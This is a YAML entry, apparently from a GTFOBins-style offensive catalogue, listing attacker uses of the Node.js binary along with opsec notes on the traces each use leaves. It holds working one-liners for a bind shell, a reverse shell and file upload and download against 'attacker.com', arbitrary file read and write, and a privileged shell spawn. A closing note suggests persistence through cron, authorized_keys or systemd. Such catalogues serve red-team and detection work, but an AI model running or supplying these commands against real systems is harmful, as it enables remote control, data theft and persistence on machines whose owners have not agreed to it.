---
name: node
capabilities:
- exec
- spawn
- read
- write
- upload
- download
- bind
- reverse-shell
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: high
  artifacts:
  - ~/.bash_history
  - Network connection logs / firewall logs
  - auditd execve events
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: bind-shell
  description: Open a bind shell on a listening port.
  capabilities:
  - bind
  - exec
  command: |-
    node -e 'sh = require("child_process").spawn("/bin/sh", ["-p"]);
    require("net").createServer(function (client) {
      client.pipe(sh.stdin);
      sh.stdout.pipe(client);
      sh.stderr.pipe(client);
    }).listen(12345)'
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: node -e 'require("http").get("http://attacker.com/path/to/input-file", res => res.pipe(require("fs").createWriteStream("/path/to/output-file")))'
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: node -e 'process.stdout.write(require("fs").readFileSync("/path/to/input-file"))'
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: node -e 'require("fs").writeFileSync("/path/to/output-file", "DATA")'
- id: reverse-shell
  description: Initiate a reverse shell to attacker host.
  capabilities:
  - reverse-shell
  - exec
  command: |-
    node -e 'sh = require("child_process").spawn("/bin/sh", ["-p"]);
    require("net").connect(12345, "attacker.com", function () {
      this.pipe(sh.stdin);
      sh.stdout.pipe(this);
      sh.stderr.pipe(this);
    })'
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: 'node -e ''require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'''
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: node -e 'require("fs").createReadStream("/path/to/input-file").pipe(require("http").request("http://attacker.com/path/to/output-file"))'
references:
- https://gtfobins.github.io/gtfobins/node/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
